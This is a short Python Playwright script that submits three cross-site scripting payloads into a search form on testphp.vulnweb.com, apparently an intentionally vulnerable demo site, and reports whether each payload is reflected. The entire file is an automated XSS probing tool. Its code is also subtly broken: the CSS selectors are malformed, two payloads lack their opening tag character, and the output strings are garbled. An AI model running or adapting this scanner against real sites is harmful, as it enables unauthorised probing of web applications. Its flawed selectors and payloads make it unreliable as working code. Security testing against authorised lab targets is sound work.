from playwright.sync_api import  sync_playwright
pyloads=[
    "img src=x onerror=prompt(1);>","+123'];alert(1);[['",
    "details ontoggle=alert`xss`><summary>Click me to demonstrate the XSS</summary></details>"
]
with sync_playwright() as p:
    browser=p.chromium.launch(headless=True)
    page=browser.new_page()
    url="http://testphp.vulnweb.com/login.php"
    page.goto(url)
    in_one="input['name=searchFor']"
    in_tow="input[ 'type=submit']"
    for pyload in pyloads:
        page.fill(in_one,pyload)
        page.click(in_tow)
        if pyload in page.content():
            print(f'[+]xss found in{url}pyload{pyload}')
        else:
            print(f'[-]xss not found Found in {url}pyload{pyload}')
    browser.close()